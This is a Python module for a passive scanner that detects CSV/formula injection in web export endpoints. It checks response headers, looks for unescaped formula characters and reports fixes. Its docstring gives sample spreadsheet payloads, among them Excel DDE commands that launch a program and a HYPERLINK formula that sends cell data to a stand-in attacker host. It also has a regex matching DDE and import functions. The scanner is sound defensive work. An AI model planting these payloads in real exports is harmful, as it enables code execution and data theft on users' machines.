"""
CSV / Formula Injection Scanner.

Formula injection (aka CSV injection, spreadsheet injection) occurs when
user-supplied data containing formula-starting characters (=, +, -, @, |, %)
is included in CSV, Excel, or ODS exports without sanitization.

When a victim opens the downloaded file in Microsoft Excel, Google Sheets,
or LibreOffice Calc, the formula executes in the user's security context:

Attack examples:
  =cmd|'/C calc'!A0          (Excel DDE remote code execution)
  =HYPERLINK("http://attacker.example.com/exfil?d="&A1,"Click Me")
  @SUM(1+1)*cmd|' /C calc'!A0
  +cmd|'/C calc'!A0

CWE-1236: Improper Neutralization of Formula Elements in a CSV File

Detection approach (passive read-only):
1. Discover export/download/CSV/Excel endpoints from page links and common paths
2. Check response Content-Type and Content-Disposition for CSV/spreadsheet content
3. Inspect response body for unescaped formula-starting characters in first column
4. Check for missing Content-Disposition header on CSV responses (enables injection)
5. Check for missing `X-Content-Type-Options: nosniff` on CSV responses
6. Look for API/form parameters that appear in CSV output without quoting

Professional equivalents: Detectify "Formula Injection", Invicti "CSV Injection",
Burp Suite Pro "CSV injection" issue, OWASP ZAP passive rule "CSV injection".

CWE-1236, OWASP A03:2021 (Injection)
"""

import re
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urlparse, urljoin


from tblue.scanner.base import BaseScanner
from tblue.logger import get_logger, log_pass, log_fail, log_warn

logger = get_logger(__name__)

# CSV/Excel content type indicators
_CSV_CONTENT_TYPES = re.compile(
    r"text/csv|application/csv|application/vnd\.ms-excel|"
    r"application/vnd\.openxmlformats-officedocument\.spreadsheetml|"
    r"application/vnd\.oasis\.opendocument\.spreadsheet",
    re.I,
)

# CSV/spreadsheet file extension in URL or Content-Disposition
_CSV_EXTENSION_RE = re.compile(r"\.(csv|xls|xlsx|ods|tsv)(?:\?|$|;|\s)", re.I)
_CONTENT_DISP_RE = re.compile(r"filename\s*=\s*[\"']?([^\"';\s]+)", re.I)

# Formula injection characters at start of cell value (RFC 4180: first char after comma or newline)
# Also covers leading whitespace before formula char (some apps add spaces)
_FORMULA_START_RE = re.compile(
    r'(?:^|,|\r\n|\n|\r)\s*(?P<formula>[=+\-@\|%])',
    re.M,
)

# DDE command injection pattern (high severity)
_DDE_PATTERN_RE = re.compile(
    r'(?:=|@)\s*(?:cmd|EXEC|HYPERLINK|DDE|DDEAUTO|IMPORTXML|IMPORTFEED|'
    r'IMPORTHTML|IMPORTRANGE|IMAGE)\s*[|(]',
    re.I,
)

# Safe formula prefix patterns (from legitimate data: ISO dates, percent values)
_SAFE_PREFIX_RE = re.compile(
    r'^(?:\d{4}-\d{2}-\d{2}|-?\d+\.?\d*%?|-?\d+,\d+|-?)$',
)

# Common export/download endpoints to probe
_EXPORT_PATHS = [
    "/export",
    "/export.csv",
    "/download",
    "/download.csv",
    "/report",
    "/report.csv",
    "/reports/export",
    "/api/export",
    "/api/v1/export",
    "/api/download",
    "/data/export",
    "/users/export",
    "/users.csv",
    "/transactions.csv",
    "/orders.csv",
    "/orders/export",
]

# Links/hrefs that suggest download/export functionality
_DOWNLOAD_LINK_RE = re.compile(
    r'href=["\']([^"\']*(?:export|download|csv|report|xlsx|xls|spreadsheet)[^"\']*)["\']',
    re.I,
)


class CSVInjectionScanner(BaseScanner):
    """Detect CSV/formula injection vulnerabilities in export endpoints."""

    def scan(self, url: str) -> List[Dict[str, Any]]:
        self.results = []

        resp = self.http.get(url)
        if resp is None:
            self.results.append(self._result(
                url, "CSV injection — target unreachable", "PASS",
                detail="No response from target."
            ))
            return self.results

        body = resp.text or ""
        resp_headers = {k.lower(): v for k, v in (resp.headers or {}).items()}
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        found_any = False

        # ── 1. Check if the main URL itself returns CSV ────────────────────────
        found_any |= self._check_csv_response(url, resp_headers, body)

        # ── 2. Find export links in the page ──────────────────────────────────
        found_any |= self._check_linked_exports(url, base, body)

        # ── 3. Probe known export endpoints ────────────────────────────────────
        found_any |= self._probe_export_paths(url, base)

        if not found_any:
            log_pass(logger, f"No CSV/formula injection vulnerabilities detected on {url}")
            self.results.append(self._result(
                url,
                "CSV injection — no formula injection vulnerabilities detected",
                "PASS",
                detail=(
                    "No CSV/spreadsheet export endpoints with unescaped formula characters "
                    "were detected. "
                    "Fix: always prefix formula-starting chars (=, +, -, @) in CSV output "
                    "with a single quote or tab; "
                    "validate and sanitize all exported data; "
                    "set Content-Disposition: attachment (not inline) for CSV responses."
                )
            ))

        return self.results

    def _check_csv_response(self, url: str, headers: dict,
                             body: str) -> bool:
        content_type = headers.get("content-type", "")
        content_disp = headers.get("content-disposition", "")

        is_csv = (bool(_CSV_CONTENT_TYPES.search(content_type)) or
                  bool(_CSV_EXTENSION_RE.search(url)) or
                  bool(_CSV_EXTENSION_RE.search(content_disp)))

        if not is_csv:
            return False

        found = False

        # Check for missing Content-Disposition: attachment
        if "attachment" not in content_disp.lower():
            log_warn(logger, f"CSV response without Content-Disposition: attachment: {url}")
            self.results.append(self._result(
                url,
                "CSV injection — CSV response lacks Content-Disposition: attachment",
                "WARN",
                detail=(
                    f"The endpoint {url} returns CSV data but without "
                    "Content-Disposition: attachment. Without this, the browser may "
                    "display the CSV inline or allow formula execution via preview. "
                    "Fix: always include `Content-Disposition: attachment; filename=...` "
                    "for CSV responses."
                )
            ))
            found = True

        # Check for unescaped formula-starting characters
        formula_found = self._detect_formula_in_csv(body)
        if formula_found:
            snippet, is_dde = formula_found
            if is_dde:
                log_fail(logger, f"DDE/formula injection payload in CSV response: {url}")
                self.results.append(self._result(
                    url,
                    "CSV injection — DDE formula command in CSV export response",
                    "FAIL",
                    detail=(
                        f"The CSV export at {url} contains a DDE formula or command "
                        f"injection payload: '{snippet}'. "
                        "When opened in Microsoft Excel or LibreOffice, this executes "
                        "the embedded command in the user's security context, potentially "
                        "achieving Remote Code Execution or data exfiltration. "
                        "Fix: sanitize all exported data — prepend a single quote (') "
                        "before any cell value starting with =, +, -, @, |, or %; "
                        "or wrap the value in double quotes with the leading char escaped."
                    )
                ))
            else:
                log_warn(logger, f"Unescaped formula character in CSV response: {url}")
                self.results.append(self._result(
                    url,
                    "CSV injection — unescaped formula-starting character in CSV export",
                    "WARN",
                    detail=(
                        f"The CSV export at {url} contains a cell value starting with "
                        f"a formula character: '{snippet}'. "
                        "If this value came from user input, it enables formula injection "
                        "(CSV injection) when the file is opened in spreadsheet software. "
                        "Fix: escape formula-starting characters (=, +, -, @, |, %) "
                        "by prefixing with a single quote or tab character in CSV output."
                    )
                ))
            found = True

        # Check for missing nosniff
        nosniff = headers.get("x-content-type-options", "")
        if "nosniff" not in nosniff.lower():
            log_warn(logger, f"CSV response missing X-Content-Type-Options: nosniff: {url}")
            self.results.append(self._result(
                url,
                "CSV injection — CSV response missing X-Content-Type-Options: nosniff",
                "WARN",
                detail=(
                    f"The CSV endpoint {url} is missing the X-Content-Type-Options: nosniff "
                    "header. Without it, some browsers may execute the CSV content as HTML "
                    "if the content type is wrong or missing. "
                    "Fix: add `X-Content-Type-Options: nosniff` to all responses; "
                    "ensure Content-Type: text/csv is returned (not text/html)."
                )
            ))
            found = True

        return found

    def _detect_formula_in_csv(self, body: str) -> Optional[Tuple[str, bool]]:
        """Return (snippet, is_dde) if formula injection patterns found, else None."""
        # First check for DDE commands (high severity)
        m = _DDE_PATTERN_RE.search(body)
        if m:
            return (body[max(0, m.start()-5):m.end()+20][:60].strip(), True)

        # Then check for formula-starting characters
        m = _FORMULA_START_RE.search(body)
        if m:
            formula_char = m.group("formula")
            # Get the full cell value to check if it's legitimately a number/date
            start = m.start("formula")
            cell_val = body[start:start+50].split(",")[0].split("\n")[0].strip()
            if _SAFE_PREFIX_RE.match(cell_val.rstrip('"')):
                return None  # legitimate numeric/date value
            if len(cell_val) > 1:  # not just a lone formula char
                return (cell_val[:60], False)
        return None

    def _check_linked_exports(self, url: str, base: str, body: str) -> bool:
        """Find export/download links and probe each one."""
        found = False
        matches = _DOWNLOAD_LINK_RE.findall(body)
        for href in matches[:5]:  # limit to 5 probes
            export_url = urljoin(base, href) if not href.startswith("http") else href
            try:
                r = self.http.get(export_url)
                if r is None:
                    continue
                r_headers = {k.lower(): v for k, v in (r.headers or {}).items()}
                if self._check_csv_response(export_url, r_headers, r.text or ""):
                    found = True
                    break
            except Exception:
                continue
        return found

    def _probe_export_paths(self, url: str, base: str) -> bool:
        """Probe common export endpoint paths."""
        found = False
        for path in _EXPORT_PATHS[:8]:  # limit probes
            export_url = base + path
            try:
                r = self.http.get(export_url)
                if r is None or r.status_code in (404, 405):
                    continue
                r_headers = {k.lower(): v for k, v in (r.headers or {}).items()}
                content_type = r_headers.get("content-type", "")
                if not _CSV_CONTENT_TYPES.search(content_type):
                    # Only probe further if content type suggests CSV
                    if not _CSV_EXTENSION_RE.search(path):
                        continue
                if self._check_csv_response(export_url, r_headers, r.text or ""):
                    found = True
                    break
            except Exception:
                continue
        return found
